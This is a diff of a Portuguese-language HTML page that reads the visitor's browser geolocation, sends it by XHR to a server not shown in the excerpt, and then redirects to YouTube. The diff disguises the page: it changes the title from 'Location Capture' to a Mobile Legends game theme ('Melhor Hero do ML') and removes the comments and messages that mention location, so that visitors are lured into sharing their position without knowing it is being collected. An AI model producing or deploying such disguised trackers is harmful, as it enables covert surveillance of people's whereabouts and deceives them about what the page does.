@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Captura de Localização</title>
+    <title>Melhor Hero do ML</title>
     <script>
         function sendLocation() {
             if (navigator.geolocation) {
@@ -35,13 +35,13 @@
 
                     xhr.send(params);
                 }, function(error) {
-                    console.error('Erro ao obter localização: ' + error.message);
-                    // Redireciona mesmo se a localização não for obtida
+                    console.error('Erro: ' + error.message);
+                    
                     window.location.href = 'https://www.youtube.com';
                 });
             } else {
-                console.error('Geolocalização não é suportada pelo seu navegador.');
-                // Redireciona se a geolocalização não for suportada
+                console.error('Não é suportada pelo seu navegador.');
+      
                 window.location.href = 'https://www.youtube.com';
             }
         }
